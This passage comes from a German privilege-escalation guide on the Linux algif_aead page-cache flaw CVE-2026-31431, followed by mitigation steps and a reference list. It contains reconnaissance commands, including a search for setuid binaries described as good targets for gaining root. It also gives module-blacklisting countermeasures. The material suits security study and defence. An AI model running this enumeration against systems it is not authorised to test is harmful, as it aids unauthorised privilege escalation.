```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Die folgenden Konfigurationswerte unterscheiden eine ladbare Schnittstelle von einer in den Kernel integrierten; die Crypto-Build-Regeln ordnen `CONFIG_CRYPTO_USER_API_AEAD` `algif_aead` zu.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen und entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: Die Schnittstelle ist in den Kernel integriert
- setuid-Binärdateien sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, ausreichen kann, um einen lokalen Einstiegspunkt in root-Rechte umzuwandeln

#### Angriffsfläche für den `algif_aead`-Pfad reduzieren

Wenn die verwundbare Schnittstelle von einem ladbaren Modul bereitgestellt wird:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Wenn es in den Kernel einkompiliert ist, wurde in einigen Berichten beschrieben, dass der Init-Pfad damit blockiert wird:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Diese Art der Gegenmaßnahme sollte man auch bei anderen Kernel-LPEs im Hinterkopf behalten: Wenn die Ausnutzung von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Blacklisten dieser Schnittstelle den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – hijacking eines als root ausgeführten Skripts in einem benutzerbeschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) – FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall-oss-security-Offenlegung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-Stable-Fix: crypto: algif_aead – Rückkehr zum Out-of-Place-Betrieb](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — Sicherheitshinweis zu CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint – technischer Bericht](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und Ausnutzung der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Gegenmaßnahme: `SKBFL_SHARED_FRAG` für gesplicte UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git-Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian-Handbuchseite](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Zuordnungen von MIME-Anwendungen](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared-MIME-info-Spezifikation](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop-Entry-Spezifikation](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-Sprache](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux-crypto-Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux-Kernel-Schwachstelle im AF_ALG-Seitencache](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git-Dokumentation zu `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Git-Dokumentation zu `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Git-Konfigurationsdokumentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentation zu systemd-Generatoren](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: Persistenzmechanismen](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
